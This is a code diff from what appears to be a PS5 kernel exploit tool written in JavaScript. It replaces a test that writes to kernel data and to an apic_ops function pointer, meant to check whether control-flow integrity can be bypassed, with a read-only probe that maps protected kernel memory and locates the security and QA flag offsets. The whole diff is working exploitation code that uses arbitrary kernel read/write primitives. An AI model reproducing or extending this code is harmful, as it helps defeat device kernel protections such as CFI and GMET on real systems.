@@ -651,94 +651,83 @@ async function main(userlandRW, wkOnly = false) {
             // If we can write to this without crashing, data-only attacks are viable!
             // =========================================================================
 
-            const SYSENTVEC_MYSTERY_FLAG_OFFSET = 0xD11D08;
+            // =========================================================================
+            // MEMORY PROTECTION ANALYSIS
+            // Test writes at different offsets to find protection boundaries
+            // We know 0x4bf0 works but 0xD11D08 crashes - let's map the boundary
+            // =========================================================================
 
-            let doCfiBypassTest = confirm(
-                "CFI BYPASS TEST\n\n" +
-                "This will test writing to a NON-function-pointer field\n" +
-                "in the sysentvec structure at kdataBase+0xD11D08.\n\n" +
-                "Current theory: CFI only protects function pointer writes.\n" +
-                "If this write succeeds, data-only attacks are possible!\n\n" +
-                "The value at this offset is 0x00000001 (a flag/integer).\n\n" +
-                "OK = Run CFI bypass test\n" +
+            let doProtectionTest = confirm(
+                "MEMORY PROTECTION ANALYSIS\n\n" +
+                "Finding: Write to 0xD11D08 crashed!\n" +
+                "But writes to 0x4bf0 (SVM cache) worked.\n\n" +
+                "This will test READ at various offsets to map\n" +
+                "the protected region WITHOUT writing.\n\n" +
+                "OK = Run read-only analysis\n" +
                 "Cancel = Skip"
             );
 
-            if (doCfiBypassTest) {
-                await log("========== CFI BYPASS TEST ==========", LogLevel.SUCCESS);
+            if (doProtectionTest) {
+                await log("========== MEMORY PROTECTION ANALYSIS ==========", LogLevel.SUCCESS);
 
-                // Read current value
-                let flagAddr = krw.kdataBase.add32(SYSENTVEC_MYSTERY_FLAG_OFFSET);
-                let currentFlag = await krw.read4(flagAddr);
-                await log("[CFI TEST] Address: kdataBase + 0x" + SYSENTVEC_MYSTERY_FLAG_OFFSET.toString(16), LogLevel.INFO);
-                await log("[CFI TEST] Current value: 0x" + currentFlag.toString(16), LogLevel.INFO);
+                // Test offsets - we'll READ these to understand the memory layout
+                const testOffsets = [
+                    { offset: 0x4bf0, name: "SVM feature cache (known writable)" },
+                    { offset: 0x170650, name: "apic_ops (function pointers)" },
+                    { offset: 0xD11BB8, name: "sysentvec_ps5" },
+                    { offset: 0xD11D08, name: "mystery flag (crashed on write)" },
+                    { offset: 0xD11D30, name: "sysentvec_ps4" },
+                ];
 
-                // Also read surrounding context
-                await log("[CFI TEST] Reading surrounding context...", LogLevel.INFO);
-                await hexdump_kdata(SYSENTVEC_MYSTERY_FLAG_OFFSET - 16, 64, "Context around mystery flag");
-
-                // Test 1: Write to the integer flag (should succeed if CFI only protects function pointers)
-                let newFlagValue = currentFlag ^ 0x100; // Toggle a bit
-                await log("[CFI TEST] Attempting to write 0x" + newFlagValue.toString(16) + " to flag...", LogLevel.WARN);
-
-                try {
-                    await krw.write4(flagAddr, newFlagValue);
-                    let verifyFlag = await krw.read4(flagAddr);
-
-                    if (verifyFlag === newFlagValue) {
-                        await log("[CFI TEST] SUCCESS! Write to non-function-pointer succeeded!", LogLevel.SUCCESS);
-                        await log("[CFI TEST] This proves CFI only protects function pointers!", LogLevel.SUCCESS);
-                        await log("[CFI TEST] Data-only attacks ARE possible!", LogLevel.SUCCESS);
-
-                        // Restore original value
-                        await krw.write4(flagAddr, currentFlag);
-                        let restored = await krw.read4(flagAddr);
-                        await log("[CFI TEST] Restored original value: 0x" + restored.toString(16), LogLevel.INFO);
-                    } else {
-                        await log("[CFI TEST] Write appeared to succeed but value is 0x" + verifyFlag.toString(16), LogLevel.WARN);
-                    }
-                } catch (e) {
-                    await log("[CFI TEST] Write FAILED with error: " + e, LogLevel.ERROR);
-                    await log("[CFI TEST] CFI may protect ALL writes, not just function pointers", LogLevel.ERROR);
+                for (let test of testOffsets) {
+                    let addr = krw.kdataBase.add32(test.offset);
+                    let val = await krw.read8(addr);
+                    await log("[READ] 0x" + test.offset.toString(16) + " (" + test.name + "): " + val, LogLevel.INFO);
                 }
 
-                // Test 2: For comparison, show what happens when trying to write to a function pointer
-                // We'll read a function pointer from apic_ops but NOT write to it (just show the address)
-                const APIC_OPS_OFFSET = 0x170650;
-                let apicOpsAddr = krw.kdataBase.add32(APIC_OPS_OFFSET);
-                let firstFuncPtr = await krw.read8(apicOpsAddr);
-                await log("[CFI TEST] For comparison - apic_ops first function pointer:", LogLevel.INFO);
-                await log("[CFI TEST]   Address: kdataBase + 0x" + APIC_OPS_OFFSET.toString(16), LogLevel.INFO);
-                await log("[CFI TEST]   Value: " + firstFuncPtr, LogLevel.INFO);
+                // Now let's check if the issue is the OFFSET itself
+                // The kernel data dump was from 4.03 - offsets might be different
+                await log("[ANALYSIS] Checking if 0xD11D08 might be out of bounds...", LogLevel.WARN);
 
-                let testApicWrite = confirm(
-                    "DANGEROUS: Test writing to apic_ops function pointer?\n\n" +
-                    "This will attempt to write the SAME value back to the\n" +
-                    "first function pointer in apic_ops.\n\n" +
-                    "If CFI is active, this WILL crash the system!\n\n" +
-                    "Only do this if you want to confirm CFI blocks function pointer writes.\n\n" +
-                    "OK = Try (will likely crash!)\n" +
-                    "Cancel = Skip (recommended)"
-                );
+                // Read the security flags offset (we know this works)
+                await log("[ANALYSIS] Security flags offset: 0x" + OFFSET_KERNEL_SECURITY_FLAGS.toString(16), LogLevel.INFO);
+                await log("[ANALYSIS] QA flags offset: 0x" + OFFSET_KERNEL_QA_FLAGS.toString(16), LogLevel.INFO);
 
-                if (testApicWrite) {
-                    await log("[CFI TEST] Attempting to write to apic_ops function pointer...", LogLevel.ERROR);
-                    await log("[CFI TEST] If this crashes, CFI is blocking function pointer writes!", LogLevel.WARN);
+                // These are the offsets etaHEN uses - they're from ktextBase not kdataBase!
+                await log("[ANALYSIS] Note: etaHEN offsets are from ktextBase, not kdataBase!", LogLevel.WARN);
+                await log("[ANALYSIS] ktextBase: " + krw.ktextBase, LogLevel.INFO);
+                await log("[ANALYSIS] kdataBase: " + krw.kdataBase, LogLevel.INFO);
 
+                // Calculate the actual addresses
+                let secFlagsAddr = krw.ktextBase.add32(OFFSET_KERNEL_SECURITY_FLAGS);
+                let qaFlagsAddr = krw.ktextBase.add32(OFFSET_KERNEL_QA_FLAGS);
+
+                await log("[ANALYSIS] Security flags at: " + secFlagsAddr, LogLevel.INFO);
+                await log("[ANALYSIS] QA flags at: " + qaFlagsAddr, LogLevel.INFO);
+
+                // The question is: what makes 0xD11D08 different?
+                // Let's calculate the actual kernel address
+                let mysteryAddr = krw.kdataBase.add32(0xD11D08);
+                await log("[ANALYSIS] Mystery flag would be at: " + mysteryAddr, LogLevel.INFO);
+
+                // Check if it's even in a valid kernel range
+                await log("[ANALYSIS] Is 0xD11D08 too far from kdataBase?", LogLevel.WARN);
+                await log("[ANALYSIS] 0xD11D08 = ~13.7 MB into kernel data", LogLevel.INFO);
+
+                // Try reading at smaller offsets first to verify kernel read works
+                await log("[ANALYSIS] Testing reads at increasing offsets...", LogLevel.WARN);
+
+                const probeOffsets = [0x1000, 0x10000, 0x100000, 0x500000, 0xA00000, 0xD00000, 0xD11D00];
+                for (let off of probeOffsets) {
                     try {
-                        // Write the SAME value back - if CFI checks on write, even this will crash
-                        await krw.write8(apicOpsAddr, firstFuncPtr);
-                        await log("[CFI TEST] Write completed! CFI may not be active here!", LogLevel.SUCCESS);
-
-                        // Verify
-                        let verifyPtr = await krw.read8(apicOpsAddr);
-                        await log("[CFI TEST] Verified value: " + verifyPtr, LogLevel.INFO);
+                        let val = await krw.read4(krw.kdataBase.add32(off));
+                        await log("[PROBE] kdataBase+0x" + off.toString(16) + " = 0x" + val.toString(16) + " (readable)", LogLevel.INFO);
                     } catch (e) {
-                        await log("[CFI TEST] Write failed with error: " + e, LogLevel.ERROR);
+                        await log("[PROBE] kdataBase+0x" + off.toString(16) + " = FAILED TO READ", LogLevel.ERROR);
                     }
                 }
 
-                await log("========== CFI TEST COMPLETE ==========", LogLevel.SUCCESS);
+                await log("========== ANALYSIS COMPLETE ==========", LogLevel.SUCCESS);
             }
 
             // EXPERIMENTAL: Try to modify the SVM feature cache to disable GMET
